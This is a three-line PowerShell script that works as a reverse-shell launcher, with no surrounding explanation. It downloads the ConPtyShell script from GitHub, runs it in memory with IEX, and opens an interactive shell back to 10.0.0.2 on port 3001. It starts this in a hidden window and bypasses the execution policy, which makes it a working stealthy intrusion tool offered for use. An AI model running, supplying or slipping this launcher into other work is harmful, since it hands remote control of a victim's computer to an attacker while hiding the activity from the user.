$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001"

$arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$command`""

Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $arguments
